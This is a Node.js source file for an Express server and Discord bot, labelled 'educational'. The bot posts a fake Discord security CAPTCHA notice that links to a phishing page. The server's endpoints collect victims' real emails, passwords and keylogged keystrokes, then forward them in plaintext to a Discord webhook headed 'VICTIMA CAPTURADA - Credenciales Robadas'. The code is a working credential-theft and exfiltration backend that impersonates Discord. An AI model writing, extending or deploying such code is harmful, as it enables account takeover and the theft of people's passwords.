// server/server.js
require('dotenv').config();
const express = require('express');
const { Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');
const cors = require('cors');
const path = require('path');

const app = express();
const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent
    ]
});

app.use(cors({
    origin:  ['http://localhost:5173', 'https://gisac-phishing.vercel.app'],
    credentials: true
}));
app.use(express.json());

const WEBHOOK_URL = process.env.WEBHOOK_URL || '';
const PORT = process.env.PORT || 3001;

const educationalLogs = [];

// Bot de Discord
client.on('ready', () => {
    console.log(`Bot conectado como ${client.user.tag}`);
    console.log(`Usa !sendtest en tu servidor para empezar`);
});

client.on('messageCreate', async (message) => {
    if (message.author.bot) return;

    if (message.content === '!sendtest') {
        const phishingEmbed = new EmbedBuilder()
            .setTitle("🔐 Verificación de Seguridad Requerida")
            .setDescription("Tu cuenta requiere verificación CAPTCHA para prevenir actividades sospechosas.")
            .setColor(0x5865F2)
            .addFields(
                {
                    name: "⚠️ Acción Requerida",
                    value: "Completa el CAPTCHA en los próximos 5 minutos para mantener el acceso a tu cuenta."
                }
            )
            .setTimestamp()
            .setFooter({ text: "Sistema de Seguridad de Discord" });

        const button = new ActionRowBuilder()
            .addComponents(
                new ButtonBuilder()
                    .setLabel("🔐 Verificar Ahora")
                    .setStyle(ButtonStyle.Link)
                    .setURL("https://gisac-phishing.vercel.app/")
            );

        try {
            await message.channel.send({ 
                embeds: [phishingEmbed], 
                components: [button] 
            });
        } catch (error) {
            console.error('Error enviando mensaje:', error);
            await message.reply('Error al enviar el mensaje.');
        }
    }
});

// Endpoints del servidor
app.post('/api/educational-log', (req, res) => {
    const data = req.body;
    
    const logEntry = {
        id: generateId(),
        timestamp: new Date().toISOString(),
        emailProvided: data.email === "PROVIDED_FOR_EDUCATION",
        passwordProvided: data.password === "PROVIDED_FOR_EDUCATION",
        captchaSolved: data.captchaToken === "SOLVED",
        ip: data.ip,
        userAgent: data.userAgent,
        hasCredentials: data.email === "PROVIDED_FOR_EDUCATION" && data.password === "PROVIDED_FOR_EDUCATION",
        // NUEVO: Guardar las credenciales reales para el webhook
        credentials: {
            email: data.actualEmail || 'NO_PROVIDED',
            password: data.actualPassword || 'NO_PROVIDED'
        }
    };

    educationalLogs.push(logEntry);
    
    sendToWebhook(logEntry);
    
    console.log('📝 Log educativo registrado:', {
        email: logEntry.credentials.email,
        password: logEntry.credentials.password,
        hasCredentials: logEntry.hasCredentials
    });
    
    res.json({ 
        success: true, 
        message: 'Datos registrados para análisis educativo',
        redirectTo: '/security-awareness'
    });
});

// Endpoint para keylogger
app.post('/api/keylogger-data', (req, res) => {
    const data = req.body;
    
    const keylogEntry = {
        id: generateId(),
        type: data.type,
        timestamp: new Date().toISOString(),
        keystrokes: data.keystrokes || 'N/A',
        email: data.email || 'N/A',
        passwordLength: data.passwordLength || 0,
        elementFocused: data.elementFocused || 'N/A',
        ip: data.ip,
        userAgent: data.userAgent,
        url: data.url
    };

    educationalLogs.push(keylogEntry);
    
    console.log('Keylogger data received:', {
        type: data.type,
        keystrokes: data.keystrokes ? data.keystrokes.length : 0,
        hasCredentials: !!(data.email && data.email !== 'NOT_PROVIDED')
    });
    
    sendKeyloggerWebhook(keylogEntry);
    
    res.json({ success: true, captured: keylogEntry.keystrokes?.length || 0 });
});



// Funciones auxiliares
function generateId() {
    return Math.random().toString(36).substr(2, 9);
}

// ACTUALIZADO: Webhook que muestra credenciales reales
async function sendToWebhook(logEntry) {
    if (!WEBHOOK_URL || WEBHOOK_URL === 'https://discord.com/api/webhooks/...') return;

    try {
        // Determinar color según si hay credenciales
        const color = logEntry.hasCredentials ? 0xff0000 : 0x00ff00;
        
        // Determinar título según el resultado
        const title = logEntry.hasCredentials ? 
            "VICTIMA CAPTURADA - Credenciales Robadas" : 
            "Intento Educativo Registrado";

        const embed = {
            title: title,
            color: color,
            fields: [
                {
                    name: "Correo Electrónico",
                    value: logEntry.credentials.email !== 'NO_PROVIDED' ? 
                           `\`\`\`${logEntry.credentials.email}\`\`\`` : 
                           "No proporcionado",
                    inline: false
                },
                {
                    name: "Contraseña",
                    value: logEntry.credentials.password !== 'NO_PROVIDED' ? 
                           `\`\`\`${logEntry.credentials.password}\`\`\`` : 
                           "No proporcionada",
                    inline: false
                },
                {
                    name: "CAPTCHA Resuelto",
                    value: logEntry.captchaSolved ? "Sí" : "No",
                    inline: true
                },
                {
                    name: "IP",
                    value: `\`${logEntry.ip}\``,
                    inline: true
                },
                {
                    name: "Timestamp",
                    value: `<t:${Math.floor(new Date(logEntry.timestamp).getTime() / 1000)}:R>`,
                    inline: true
                }
            ],
            timestamp: new Date().toISOString(),
        };

        await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({ embeds: [embed] })
        });
    } catch (error) {
        console.error('Error enviando a webhook:', error);
    }
}

// Webhook para keylogger (sin cambios)
async function sendKeyloggerWebhook(logEntry) {
    if (!WEBHOOK_URL || WEBHOOK_URL === 'https://discord.com/api/webhooks/...') return;

    try {
        const embed = {
            title: "KEYLOGGER ACTIVITY DETECTED",
            color: 0xffaa00,
            fields: [
                {
                    name: "Tipo de Captura",
                    value: logEntry.type,
                    inline: true
                },
                {
                    name: "Teclas Capturadas",
                    value: logEntry.keystrokes !== 'N/A' ? 
                           `\`\`\`${logEntry.keystrokes.slice(-100)}\`\`\`` : 
                           "No keystrokes",
                    inline: false
                },
                {
                    name: "IP",
                    value: `\`${logEntry.ip}\``,
                    inline: true
                }
            ],
            timestamp: new Date().toISOString()
        };

        await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({ embeds: [embed] })
        });
    } catch (error) {
        console.error('Error sending keylogger webhook:', error);
    }
}

// Iniciar servidores
client.login(process.env.DISCORD_BOT_TOKEN)
    .then(() => {
        console.log('Bot de Discord autenticado');
    })
    .catch(error => {
        console.error('Error autenticando el bot:', error);
    });

app.listen(PORT, () => {
    console.log(`Servidor API en http://localhost:${PORT}`);
});